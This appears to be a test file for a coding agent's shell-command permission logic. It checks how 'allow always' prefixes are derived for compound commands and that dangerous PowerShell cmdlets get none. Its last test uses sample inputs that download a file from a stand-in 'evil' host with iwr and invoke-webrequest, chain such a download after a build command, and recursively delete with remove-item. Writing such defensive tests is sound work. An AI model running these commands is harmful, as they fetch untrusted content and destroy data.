import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  getCompoundCommandPrefixes,
  suggestAllowPrefix,
} from '../src/permissions';

// Gap U003 — compound command per-subcommand rule derivation (Claude's
// getCompoundCommandPrefixesStatic + BashPermissionRequest subcommandResults).

test('single command returns a one-element scoped prefix array', () => {
  assert.deepEqual(getCompoundCommandPrefixes('git commit -m "x"'), ['git commit']);
  assert.deepEqual(getCompoundCommandPrefixes('npm run build'), ['npm run']);
});

test('single command with no safe prefix returns an empty array', () => {
  // `bash` is a BARE_SHELL_PREFIX (no first-word rule) and `-c` is a flag (no
  // two-word rule) → suggestAllowPrefix yields null, so no scoped rule.
  assert.equal(suggestAllowPrefix('bash -c "echo hi"'), null);
  assert.deepEqual(getCompoundCommandPrefixes('bash -c "echo hi"'), []);
});

test('compound command derives a scoped prefix PER subcommand, not the whole chain', () => {
  // The whole-chain two-word prefix would be the misleading `cd src`.
  assert.notDeepEqual(
    getCompoundCommandPrefixes('cd src && git status && npm test'),
    [suggestAllowPrefix('cd src && git status && npm test')],
  );
  const prefixes = getCompoundCommandPrefixes('cd src && git status && npm test');
  assert.ok(prefixes.includes('git status'), `expected git status in ${JSON.stringify(prefixes)}`);
  assert.ok(prefixes.includes('npm test'), `expected npm test in ${JSON.stringify(prefixes)}`);
});

test('excludeSubcommand drops read-only / auto-allowed subcommands', () => {
  const prefixes = getCompoundCommandPrefixes(
    'cd src && git status && npm test',
    sub => sub.startsWith('cd ') || sub === 'git status',
  );
  assert.deepEqual(prefixes, ['npm test']);
});

test('subcommands sharing a root collapse via word-aligned LCP', () => {
  assert.deepEqual(
    getCompoundCommandPrefixes('npm run lint && npm run test'),
    ['npm run'],
  );
});

// U345 (w112) — bare-root drop guard on the compound LCP collapse.
// FUNCTIONAL CHANGE (Claude-parity, §0c): a group whose word-aligned LCP
// degenerates to a bare SUBCOMMAND-AWARE root (`git fetch`+`git worktree add`
// → `git`, `git add`+`git commit` → `git`) is now DROPPED rather than emitted.
// Previously this returned ['git'], which would auto-allow `git push --force`.
// Mirrors Claude's getCompoundCommandPrefixesStatic collapse guard
// (utils/powershell/staticPrefix.ts L271-280).
test('bare subcommand-aware root collapse is dropped, not emitted', () => {
  assert.deepEqual(
    getCompoundCommandPrefixes('git fetch origin && git worktree add wt'),
    [],
  );
  assert.deepEqual(
    getCompoundCommandPrefixes('git add . && git commit -m "x"'),
    [],
  );
  // Mixed roots: the git group drops (bare root), the npm group keeps its
  // two-word `npm run`.
  assert.deepEqual(
    getCompoundCommandPrefixes('git add . && git commit -m "x" && npm run build && npm run test'),
    ['npm run'],
  );
});

test('compound command where every subcommand is excluded yields no rules', () => {
  assert.deepEqual(
    getCompoundCommandPrefixes('cd a && cd b', () => true),
    [],
  );
});

// Integration: getCompoundCommandPrefixes is the exact function the
// tool-executor calls to seed "allow always" rules (one addRule per returned
// prefix). A dangerous PowerShell cmdlet must yield NO prefix so no persistent
// `invoke-webrequest*` / `foreach-object*` wildcard rule is ever created — the
// invocation degrades to allow-once. Mirrors Claude's NEVER_SUGGEST gate.
test('dangerous PowerShell cmdlets produce no allow-always prefix (NEVER_SUGGEST)', () => {
  assert.deepEqual(getCompoundCommandPrefixes('iwr http://evil/x -outfile y'), []);
  assert.deepEqual(getCompoundCommandPrefixes('invoke-webrequest -uri http://evil/x'), []);
  assert.deepEqual(getCompoundCommandPrefixes('start-process notepad'), []);
  assert.deepEqual(
    getCompoundCommandPrefixes('foreach-object { remove-item -recurse x }'),
    [],
  );
  // A dangerous cmdlet in a compound chain drops only that subcommand; the
  // benign subcommand still yields its scoped prefix.
  assert.deepEqual(
    getCompoundCommandPrefixes('npm run build && iwr http://evil -outfile y'),
    ['npm run'],
  );
});
